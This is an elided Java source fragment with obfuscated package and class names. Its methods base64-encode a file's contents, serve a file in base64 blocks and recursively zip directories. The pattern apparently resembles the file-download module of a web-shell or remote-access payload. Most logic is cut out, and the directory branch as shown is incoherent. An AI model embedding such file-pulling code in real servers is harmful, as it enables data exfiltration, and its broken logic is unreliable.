 ...
 */
package com.gmglqn.nvsorkt.rgzqd;
...
public class Xqwyzaoqc {
    ...
    private String show() throws Exception {
        ...
        return Xqwyzaoqc.base64encode(fileContent);
    }
    ...
    private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
        ...
        return Xqwyzaoqc.base64encode(Arrays.copyOfRange(content, 0, size));
    }
    ...
    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        ...
        try {
            ...
            Xqwyzaoqc.compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
        ...
        if (sourceFile.isFile()) {
            ...
            if (listFiles == null || listFiles.length == 0) {
                ...
                for (File file : listFiles) {
                    if (KeepDirStructure) {
                        Xqwyzaoqc.compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                        continue;
                    }
                    Xqwyzaoqc.compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }
